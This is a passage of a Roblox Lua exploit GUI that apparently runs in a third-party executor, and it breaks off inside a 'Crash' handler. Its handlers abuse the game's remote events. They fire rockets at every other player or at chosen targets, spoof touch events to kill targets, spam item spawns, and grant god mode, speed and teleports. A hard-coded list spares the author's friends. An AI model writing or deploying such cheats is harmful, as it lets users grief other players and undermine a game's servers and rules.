			Prev1.TextSize = 14.000
	
			Next2.Name = "Next2"
			Next2.Parent = MainFrame
			Next2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Next2.Position = UDim2.new(0.908999979, 0, 0.36500001, 0)
			Next2.Size = UDim2.new(0, 31, 0, 52)
			Next2.Visible = false
			Next2.Style = Enum.ButtonStyle.RobloxRoundButton
			Next2.Font = Enum.Font.SourceSansLight
			Next2.Text = "Next"
			Next2.TextColor3 = Color3.fromRGB(0, 0, 0)
			Next2.TextSize = 14.000
	
			Prev2.Name = "Prev2"
			Prev2.Parent = MainFrame
			Prev2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Prev2.Position = UDim2.new(-0.00600000005, 0, 0.340000004, 0)
			Prev2.Size = UDim2.new(0, 31, 0, 52)
			Prev2.Visible = false
			Prev2.Style = Enum.ButtonStyle.RobloxRoundButton
			Prev2.Font = Enum.Font.SourceSansLight
			Prev2.Text = "Prev"
			Prev2.TextColor3 = Color3.fromRGB(0, 0, 0)
			Prev2.TextSize = 14.000
	
			Page3Frame.Name = "Page3Frame"
			Page3Frame.Parent = MainFrame
			Page3Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page3Frame.Position = UDim2.new(0.0860000029, 0, 0, 0)
			Page3Frame.Size = UDim2.new(0, 282, 0, 163)
			Page3Frame.Visible = false
	
			Page3.Name = "Page 3"
			Page3.Parent = Page3Frame
			Page3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page3.BackgroundTransparency = 1.000
			Page3.Position = UDim2.new(0.273049712, 0, 0.801993728, 0)
			Page3.Size = UDim2.new(0, 128, 0, 37)
			Page3.Font = Enum.Font.SourceSansItalic
			Page3.Text = "Page 3"
			Page3.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page3.TextSize = 14.000
	
			InfiniteJump.Name = "InfiniteJump"
			InfiniteJump.Parent = Page3Frame
			InfiniteJump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			InfiniteJump.Size = UDim2.new(0, 57, 0, 57)
			InfiniteJump.Style = Enum.ButtonStyle.RobloxRoundButton
			InfiniteJump.Font = Enum.Font.SourceSansLight
			InfiniteJump.Text = "InfJump"
			InfiniteJump.TextColor3 = Color3.fromRGB(0, 0, 0)
			InfiniteJump.TextSize = 14.000
	
			Invis.Name = "Invis"
			Invis.Parent = Page3Frame
			Invis.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Invis.Position = UDim2.new(0.797872365, 0, 0, 0)
			Invis.Size = UDim2.new(0, 57, 0, 57)
			Invis.Style = Enum.ButtonStyle.RobloxRoundButton
			Invis.Font = Enum.Font.SourceSansLight
			Invis.Text = "Invis"
			Invis.TextColor3 = Color3.fromRGB(0, 0, 0)
			Invis.TextSize = 14.000
	
			Requires.Name = "Requires"
			Requires.Parent = Page3Frame
			Requires.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Requires.BackgroundTransparency = 1.000
			Requires.Position = UDim2.new(0.762411475, 0, 0.349693239, 0)
			Requires.Size = UDim2.new(0, 75, 0, 22)
			Requires.Font = Enum.Font.SourceSansLight
			Requires.Text = "Requires Invis Cape"
			Requires.TextColor3 = Color3.fromRGB(255, 255, 255)
			Requires.TextScaled = true
			Requires.TextSize = 14.000
			Requires.TextWrapped = true
	
			AirWalk.Name = "AirWalk"
			AirWalk.Parent = Page3Frame
			AirWalk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AirWalk.Position = UDim2.new(0.202127695, 0, 0, 0)
			AirWalk.Size = UDim2.new(0, 57, 0, 57)
			AirWalk.Style = Enum.ButtonStyle.RobloxRoundButton
			AirWalk.Font = Enum.Font.SourceSansLight
			AirWalk.Text = "AirWalk"
			AirWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
			AirWalk.TextSize = 14.000
	
			UnAirWalk.Name = "UnAirWalk"
			UnAirWalk.Parent = Page3Frame
			UnAirWalk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAirWalk.Position = UDim2.new(0.202127695, 0, 0, 0)
			UnAirWalk.Size = UDim2.new(0, 57, 0, 57)
			UnAirWalk.Visible = false
			UnAirWalk.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAirWalk.Font = Enum.Font.SourceSansLight
			UnAirWalk.Text = "UnAirWalk"
			UnAirWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAirWalk.TextSize = 14.000
	
			ClickTP.Name = "ClickTP"
			ClickTP.Parent = Page3Frame
			ClickTP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ClickTP.Position = UDim2.new(0.40425536, 0, 0, 0)
			ClickTP.Size = UDim2.new(0, 57, 0, 57)
			ClickTP.Style = Enum.ButtonStyle.RobloxRoundButton
			ClickTP.Font = Enum.Font.SourceSansLight
			ClickTP.Text = "ClickTP"
			ClickTP.TextColor3 = Color3.fromRGB(0, 0, 0)
			ClickTP.TextSize = 14.000
	
			Crash.Name = "Crash"
			Crash.Parent = Page3Frame
			Crash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Crash.Position = UDim2.new(0.602836907, 0, 0, 0)
			Crash.Size = UDim2.new(0, 57, 0, 57)
			Crash.Style = Enum.ButtonStyle.RobloxRoundButton
			Crash.Font = Enum.Font.SourceSansLight
			Crash.Text = "Crash"
			Crash.TextColor3 = Color3.fromRGB(0, 0, 0)
			Crash.TextSize = 14.000
	
			Patience.Name = "Patience"
			Patience.Parent = Page3Frame
			Patience.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Patience.BackgroundTransparency = 1.000
			Patience.Position = UDim2.new(0.613475204, 0, 0.346280515, 0)
			Patience.Size = UDim2.new(0, 51, 0, 34)
			Patience.Font = Enum.Font.SourceSansLight
			Patience.Text = "This Script takes a while be patient"
			Patience.TextColor3 = Color3.fromRGB(255, 255, 255)
			Patience.TextScaled = true
			Patience.TextSize = 14.000
			Patience.TextWrapped = true
	
			T.Name = "T"
			T.Parent = Page3Frame
			T.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			T.BackgroundTransparency = 1.000
			T.Position = UDim2.new(0.439716309, 0, 0.361963183, 0)
			T.Size = UDim2.new(0, 33, 0, 27)
			T.Font = Enum.Font.SourceSansLight
			T.Text = "Ctrl + L to TP"
			T.TextColor3 = Color3.fromRGB(255, 255, 255)
			T.TextScaled = true
			T.TextSize = 14.000
			T.TextWrapped = true
	
			Control.Name = "Control"
			Control.Parent = Page3Frame
			Control.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Control.BackgroundTransparency = 1.000
			Control.Position = UDim2.new(0.202127665, 0, 0.361963212, 0)
			Control.Size = UDim2.new(0, 57, 0, 20)
			Control.Font = Enum.Font.SourceSansLight
			Control.Text = "Press Ctrl to go down"
			Control.TextColor3 = Color3.fromRGB(255, 255, 255)
			Control.TextScaled = true
			Control.TextSize = 14.000
			Control.TextWrapped = true
	
			Untoggleable.Name = "Untoggleable"
			Untoggleable.Parent = Page3Frame
			Untoggleable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Untoggleable.BackgroundTransparency = 1.000
			Untoggleable.Position = UDim2.new(0.0212765969, 0, 0.346280515, 0)
			Untoggleable.Size = UDim2.new(0, 45, 0, 30)
			Untoggleable.Font = Enum.Font.SourceSansLight
			Untoggleable.Text = "This is not untoggleable"
			Untoggleable.TextColor3 = Color3.fromRGB(255, 255, 255)
			Untoggleable.TextScaled = true
			Untoggleable.TextSize = 14.000
			Untoggleable.TextWrapped = true
	
			ToVoid.Name = "ToVoid"
			ToVoid.Parent = Page3Frame
			ToVoid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ToVoid.Position = UDim2.new(0, 0, 0.527607381, 0)
			ToVoid.Size = UDim2.new(0, 57, 0, 57)
			ToVoid.Style = Enum.ButtonStyle.RobloxRoundButton
			ToVoid.Font = Enum.Font.SourceSansLight
			ToVoid.Text = "ToVoid"
			ToVoid.TextColor3 = Color3.fromRGB(0, 0, 0)
			ToVoid.TextSize = 14.000
	
			Reset.Name = "Reset"
			Reset.Parent = Page3Frame
			Reset.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Reset.BackgroundTransparency = 1.000
			Reset.Position = UDim2.new(0.0212766007, 0, 0.824808121, 0)
			Reset.Size = UDim2.new(0, 46, 0, 29)
			Reset.Font = Enum.Font.SourceSansLight
			Reset.Text = "Reset to go back to map"
			Reset.TextColor3 = Color3.fromRGB(255, 255, 255)
			Reset.TextScaled = true
			Reset.TextSize = 14.000
			Reset.TextWrapped = true
	
			UnToVoid.Name = "UnToVoid"
			UnToVoid.Parent = Page3Frame
			UnToVoid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnToVoid.Position = UDim2.new(0, 0, 0.527607381, 0)
			UnToVoid.Size = UDim2.new(0, 57, 0, 57)
			UnToVoid.Visible = false
			UnToVoid.Style = Enum.ButtonStyle.RobloxRoundButton
			UnToVoid.Font = Enum.Font.SourceSansLight
			UnToVoid.Text = "UnToVoid"
			UnToVoid.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnToVoid.TextSize = 14.000
	
			KillHits.Name = "KillHits"
			KillHits.Parent = Page3Frame
			KillHits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KillHits.Position = UDim2.new(0.202127665, 0, 0.527607381, 0)
			KillHits.Size = UDim2.new(0, 57, 0, 57)
			KillHits.Style = Enum.ButtonStyle.RobloxRoundButton
			KillHits.Font = Enum.Font.SourceSansLight
			KillHits.Text = "KillHits"
			KillHits.TextColor3 = Color3.fromRGB(0, 0, 0)
			KillHits.TextSize = 14.000
	
			UnKillHits.Name = "UnKillHits"
			UnKillHits.Parent = Page3Frame
			UnKillHits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKillHits.Position = UDim2.new(0.202127665, 0, 0.527607381, 0)
			UnKillHits.Size = UDim2.new(0, 57, 0, 57)
			UnKillHits.Visible = false
			UnKillHits.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKillHits.Font = Enum.Font.SourceSansLight
			UnKillHits.Text = "UnKillHits"
			UnKillHits.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKillHits.TextSize = 14.000
	
			CharacterRemove.Name = "CharacterRemove"
			CharacterRemove.Parent = Page3Frame
			CharacterRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			CharacterRemove.Position = UDim2.new(0.404255331, 0, 0.527607381, 0)
			CharacterRemove.Size = UDim2.new(0, 57, 0, 57)
			CharacterRemove.Style = Enum.ButtonStyle.RobloxRoundButton
			CharacterRemove.Font = Enum.Font.SourceSansLight
			CharacterRemove.Text = "DeleteMe"
			CharacterRemove.TextColor3 = Color3.fromRGB(0, 0, 0)
			CharacterRemove.TextSize = 14.000
	
			UnCharacterRemove.Name = "UnCharacterRemove"
			UnCharacterRemove.Parent = Page3Frame
			UnCharacterRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnCharacterRemove.Position = UDim2.new(0.404255331, 0, 0.527607381, 0)
			UnCharacterRemove.Size = UDim2.new(0, 57, 0, 57)
			UnCharacterRemove.Visible = false
			UnCharacterRemove.Style = Enum.ButtonStyle.RobloxRoundButton
			UnCharacterRemove.Font = Enum.Font.SourceSansLight
			UnCharacterRemove.Text = "Reset"
			UnCharacterRemove.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnCharacterRemove.TextSize = 14.000
	
			AntiCrash.Name = "AntiCrash"
			AntiCrash.Parent = Page3Frame
			AntiCrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AntiCrash.Position = UDim2.new(0.602836847, 0, 0.527607381, 0)
			AntiCrash.Size = UDim2.new(0, 57, 0, 57)
			AntiCrash.Style = Enum.ButtonStyle.RobloxRoundButton
			AntiCrash.Font = Enum.Font.SourceSansLight
			AntiCrash.Text = "AntiCrash"
			AntiCrash.TextColor3 = Color3.fromRGB(0, 0, 0)
			AntiCrash.TextSize = 14.000
	
			UnAntiCrash.Name = "UnAntiCrash"
			UnAntiCrash.Parent = Page3Frame
			UnAntiCrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAntiCrash.Position = UDim2.new(0.602836847, 0, 0.527607381, 0)
			UnAntiCrash.Size = UDim2.new(0, 57, 0, 57)
			UnAntiCrash.Visible = false
			UnAntiCrash.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAntiCrash.Font = Enum.Font.SourceSansLight
			UnAntiCrash.Text = "UnAntiCrash"
			UnAntiCrash.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAntiCrash.TextSize = 14.000
	
			KrnlCbring.Name = "KrnlCbring"
			KrnlCbring.Parent = Page3Frame
			KrnlCbring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KrnlCbring.Position = UDim2.new(0.797872305, 0, 0.527607381, 0)
			KrnlCbring.Size = UDim2.new(0, 57, 0, 57)
			KrnlCbring.Style = Enum.ButtonStyle.RobloxRoundButton
			KrnlCbring.Font = Enum.Font.SourceSansLight
			KrnlCbring.Text = "Cbring"
			KrnlCbring.TextColor3 = Color3.fromRGB(0, 0, 0)
			KrnlCbring.TextSize = 14.000
	
			UnKrnlCbring.Name = "UnKrnlCbring"
			UnKrnlCbring.Parent = Page3Frame
			UnKrnlCbring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKrnlCbring.Position = UDim2.new(0.797872305, 0, 0.527607381, 0)
			UnKrnlCbring.Size = UDim2.new(0, 57, 0, 57)
			UnKrnlCbring.Visible = false
			UnKrnlCbring.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKrnlCbring.Font = Enum.Font.SourceSansLight
			UnKrnlCbring.Text = "UnCbring"
			UnKrnlCbring.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKrnlCbring.TextSize = 14.000
	
			ThanksRyan.Name = "ThanksRyan"
			ThanksRyan.Parent = LBBGui
			ThanksRyan.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			ThanksRyan.Position = UDim2.new(0.243362829, 0, 0.337883949, 0)
			ThanksRyan.Size = UDim2.new(0, 695, 0, 284)
			ThanksRyan.Visible = false
	
			TextLabel_2.Parent = ThanksRyan
			TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel_2.BackgroundTransparency = 1.000
			TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel_2.Position = UDim2.new(0.178417265, 0, 0.225352108, 0)
			TextLabel_2.Size = UDim2.new(0, 447, 0, 156)
			TextLabel_2.Font = Enum.Font.FredokaOne
		     TextLabel_2.Text = "carioca fudido obrigado por usar esse script :3"
			TextLabel_2.TextColor3 = Color3.fromRGB(218, 48, 80)
			TextLabel_2.TextScaled = true
			TextLabel_2.TextSize = 14.000
			TextLabel_2.TextWrapped = true
	
			XButton.Name = "XButton"
			XButton.Parent = ThanksRyan
			XButton.BackgroundColor3 = Color3.fromRGB(140, 27, 44)
			XButton.Position = UDim2.new(0.952517986, 0, 0, 0)
			XButton.Size = UDim2.new(0, 33, 0, 24)
			XButton.Font = Enum.Font.SourceSans
			XButton.Text = "X"
			XButton.TextColor3 = Color3.fromRGB(0, 0, 0)
			XButton.TextScaled = true
			XButton.TextSize = 14.000
			XButton.TextWrapped = true
	
			UICorner.Parent = XButton
	
			UICorner_2.Parent = ThanksRyan
	
			-- Scripts:
	
			local function CNJMHJX_fake_script() -- LBBGui.Script 
				local script = Instance.new('Script', LBBGui)
	
				--previoustable
				local previous = {}
	
				--safetable
				local Safe = {"bielsamorim1", "icekingmaster111"}
	
				--targetsTable
				local Targets = {}
	
				--Special for Ryan
				if game.Players.LocalPlayer.Name == "tyvear" then
					ThanksRyan.Visible = true
				end
	
				--XButton
				XButton.MouseButton1Down:connect(function()
					ThanksRyan.Visible = false
				end)
	
				--frame
				frame = script.Parent.DragFrame
				frame.Draggable = true
				frame.Active = true
				frame.Selectable = true
	
				--startmessage
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "Thank you for using my Gui:";
					Color = Color3.fromRGB(255,143,223);
					Font = Enum.Font.SourceSansBold;
					FontSize = Enum.FontSize.Size96;
				})
	
				--block
				local Block = Instance.new("Part", workspace)
				Block.Name = "PlatformBlock"
				Block.Position = Vector3.new(300000, 300000, 300000)
				Block.Size = Vector3.new(10000, 3, 10000)
				Block.BrickColor = BrickColor.Random()
				Block.CanCollide = true
				Block.Anchored = true
	
				--cbring
				CBRING.MouseButton1Down:connect(function()
					_G.Cbring = true
	
					while _G.Cbring == true do
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i, v in pairs(game.Players:GetChildren()) do
								if v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" and v.Name ~= "Zanonner" and v.Name ~= "BubbaGumpWasTaken" then
									if v.Character.Humanoid.Health > 0 then
										game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),v.Character.Head.Position)
									end
								end
							end
						end)
					end
				end)
				CBRING.MouseButton1Down:connect(function()
					OFF.Visible = true
					CBRING.Visible = false
				end)
	
				--rocket
				Rocket.MouseButton1Down:connect(function()
					_G.Activate = true
	
					repeat 
						game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
						game:GetService("RunService").RenderStepped:wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper")
	
					while _G.Activate do
						wait()
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.VoidGiver.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverRainbow2.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverRainbow1.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverGalaxy1.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverGalaxy2.ColoredParts.TouchMe.Position)
					end
				end)
				Rocket.MouseButton1Down:connect(function()
					UnRocket.Visible = true
					Rocket.Visible = false
				end)
	
				--uncbring
				OFF.MouseButton1Down:connect(function()
					OFF.Visible = false
					CBRING.Visible = true
					_G.Cbring = false
				end)
	
				--unrocket
				UnRocket.MouseButton1Down:connect(function()
					UnRocket.Visible = false
					Rocket.Visible = true
					_G.Activate = false
				end)
	
				--getgear
				GetGear.MouseButton1Down:connect(function()
					_G.OpenBlocks = true
	
					while _G.OpenBlocks == true do
						wait()
						game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
					end
				end)
	
				--TPtomid
				TP.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1041, 194, 90)
				end)
	
				--name
				Name:GetPropertyChangedSignal("Text"):Connect(function()
					for i = 1, #game.Players:GetPlayers() do
						if string.lower(string.sub(game.Players:GetPlayers()[i].Name, 1, string.len(Name.Text))) == string.lower(Name.Text) then
							Target = game.Players:GetPlayers()[i].Name
							break
						end
					end
				end)
	
				--toplr
				ToPlr.MouseButton1Down:connect(function()
					local PlayerName = Target
					local plr = game.Workspace:FindFirstChild(PlayerName)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plr.HumanoidRootPart.CFrame * CFrame.new(-1,0,1)
				end)
	
				--rockettarget
				RocketTarget.MouseButton1Down:connect(function()
					_G.RocketTarget = true
					while _G.RocketTarget do
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i,v in pairs(game.Players:GetChildren()) do
								if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer and v.Name ~= "Zanonner" and v.Name ~= "BubbaGumpWasTaken" then
									if game.Players:FindFirstChild(v.Name) then
										if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
											game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Head.Position)
										end
									end
								end
							end
						end)
					end
				end)
	
	
	
				RocketTarget.MouseButton1Down:connect(function()
					RocketTarget.Visible = false
					UnRocketTarget.Visible = true
				end)
	
				--unrockettarget
				UnRocketTarget.MouseButton1Down:connect(function()
					_G.RocketTarget = false
				end)
				UnRocketTarget.MouseButton1Down:connect(function()
					RocketTarget.Visible = true
					UnRocketTarget.Visible = false
				end)
	
				--killtarget
				KillTarget.MouseButton1Down:connect(function()
					_G.KillTarget = true
					while _G.KillTarget == true do
						game:GetService("RunService").RenderStepped:wait()
						for i,v in pairs(game.Players:GetChildren()) do
							if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer and v.Name ~= "Zanonner" and v.Name ~= "BubbaGumpWasTaken" then
								spawn(function()
									local Handle = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle
									if Handle then
										for i,c in pairs(v.Character:GetChildren()) do
											if c:IsA("BasePart") then
												c = ((c.IsA(c, "BasePart") and firetouchinterest(Handle, c, 1,(game:GetService("RunService").RenderStepped.Wait(game:GetService("RunService").RenderStepped) and nil) or firetouchinterest(Handle, c, 0)) and nil) or c) or c
											end
										end
									end
								end)
							end
						end
					end
				end)
				KillTarget.MouseButton1Down:connect(function()
					KillTarget.Visible = false
					UnKillTarget.Visible = true
				end)
	
				--unkilltarget
				UnKillTarget.MouseButton1Down:connect(function()
					_G.KillTarget = false
				end)
				UnKillTarget.MouseButton1Down:connect(function()
					UnKillTarget.Visible = false
					KillTarget.Visible = true
				end)
	
				--regen
				Regen.MouseButton1Down:connect(function()
					local gearname2 = "TigerSkin"    
					repeat
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
					until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname2)
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(game.Players.LocalPlayer.Backpack:WaitForChild("TigerSkin"))
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					mouse1click()
					wait()
					hum:UnequipTools()
					while game.RunService.RenderStepped:wait() do
						if hum and hum.Health <= 99 and hum.Health ~= 0 then
							if game.Players.LocalPlayer.Backpack:FindFirstChild("TigerSkin") then
								hum:EquipTool(game.Players.LocalPlayer.Backpack.TigerSkin)
								hum:UnequipTools()
							end
						end
					end
				end)
	
				--godmode
				GodMode.MouseButton1Down:connect(function()
					local gearname3 = "LockonLauncher"
					local gearname4 = "ChartreusePeriastron"
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
	
					repeat
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
					until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4)
	
					if game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4) then
						game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4).Parent = game.Players.LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character.ChartreusePeriastron.Remote:FireServer(Enum.KeyCode.Q)
						wait(0.5)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,10,0)
						game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3).Parent = game.Players.LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character.LockonLauncher.Remote:FireServer(Vector3.new(-1172, 190, 201),Vector3.new(-1040, 195, 87))
					end
				end)
	
				--antiafk
				AntiAFK.MouseButton1Down:connect(function()
					local vu = game:GetService("VirtualUser")
					game:GetService("Players").LocalPlayer.Idled:connect(function()
						vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
						wait(1)
						vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
					end)
				end)
	
				--anchor
				Anchor.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				end)
				Anchor.MouseButton1Down:connect(function()
					Anchor.Visible = false
					UnAnchor.Visible = true
				end)
	
				--unanchor
				UnAnchor.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				end)
				UnAnchor.MouseButton1Down:connect(function()
					Anchor.Visible = true
					UnAnchor.Visible = false
				end)
	
				--speed
				Speed.MouseButton1Down:connect(function()
					pcall(function()
						while true do
							game.RunService.RenderStepped:wait()
							for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
								if v.Name == "Humanoid" then
									v.WalkSpeed = WalkSpeed1.Text
								end
							end
						end
					end)
				end)
	
				--jump
				Jump.MouseButton1Down:connect(function()
					pcall(function()
						while true do
							game.RunService.RenderStepped:wait()
							for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
								if v.Name == "Humanoid" then
									v.JumpPower = JumpHeight.Text
								end
							end
						end
					end)
				end)
	
				--safespot
				SafeSpot.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300000, 300001, 300000)
				end)
	
				--next1
				Next1.MouseButton1Down:connect(function()
					Page2Frame.Visible = true
					Page1Frame.Visible = false
					Prev1.Visible = true
					Next1.Visible = false
					Next2.Visible = true
				end)
	
				--prev1
				Prev1.MouseButton1Down:connect(function()
					Page2Frame.Visible = false
					Page1Frame.Visible = true
					Next1.Visible = true
					Prev1.Visible = false
					Next2.Visible = false
				end)
	
				--next2
				Next2.MouseButton1Down:connect(function()
					Page3Frame.Visible = true
					Page2Frame.Visible = false
					Prev2.Visible = true
					Next1.Visible = false
					Next2.Visible = false
					Prev1.Visible = false
				end)
	
				--prev2
				Prev2.MouseButton1Down:connect(function()
					Page3Frame.Visible = false
					Page2Frame.Visible = true
					Next2.Visible = true
					Prev2.Visible = false
					Prev1.Visible = true
				end)
	
				--infjump
				InfiniteJump.MouseButton1Down:connect(function()
					local function Jump()
						_G.Jump = game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
					end
	
					game.UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
						if input.UserInputType == Enum.UserInputType.Keyboard then
							if input.KeyCode == Enum.KeyCode.Space then
								Jump()
							end
						end
					end)
				end)
	
				--invis
				Invis.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(game.Players.LocalPlayer.Backpack:WaitForChild("TrololoCapeOfInvisibility"))
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					mouse1click()
					wait(0.25)
					repeat
						game.RunService.RenderStepped:wait()
					until game.Players.LocalPlayer.Character.Torso.Transparency ~= 1
	
					hum:UnequipTools()
				end)
	
				--airwalk
				AirWalk.MouseButton1Down:connect(function()
					mouse = game.Players.LocalPlayer:GetMouse()
					_G.AirWalk = true
	
	
					local WalkPart = Instance.new("Part", workspace)
					WalkPart.Size = Vector3.new(7, 2, 3)
					WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
					WalkPart.Transparency = 1
					WalkPart.Anchored = true
					WalkPart.Name = "Airwalk"
	
	
					mouse.KeyDown:Connect(function(key)
						if key == "2" then
							WalkPart.Size = Vector3.new(4, -0.5, 3)
						end
					end)
	
					mouse.KeyUp:Connect(function(key)
						if key == "2" then
							WalkPart.Size = Vector3.new(7, 2, 3)
						end
					end)
	
					repeat
						WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
						wait()
					until _G.AirWalk == false
					WalkPart:Destroy()
				end)
				AirWalk.MouseButton1Down:connect(function()
					AirWalk.Visible = false
					UnAirWalk.Visible = true
				end)
	
				--unairwalk
				UnAirWalk.MouseButton1Down:connect(function()
					_G.AirWalk = false
				end)
				UnAirWalk.MouseButton1Down:connect(function()
					UnAirWalk.Visible = false
					AirWalk.Visible = true
				end)
	
				--Clicktp
				ClickTP.MouseButton1Down:connect(function()
					_G.ClickTp = true
					game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
						if (input.KeyCode == Enum.KeyCode.L and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl)) or (input.KeyCode == Enum.KeyCode.LeftControl and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.L)) then
							if game.Players.LocalPlayer:GetMouse().Target then 
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.x, game.Players.LocalPlayer:GetMouse().Hit.y + 5, game.Players.LocalPlayer:GetMouse().Hit.z)
							end
						end
					end)
				end)
	
				--Crash
				Crash.MouseButton1Down:connect(function()
					local hum = game.Players.LocalPlayer.Character.Humanoid
					local Timer = 50
					local Crash = 0
					local cam = workspace.CurrentCamera
	
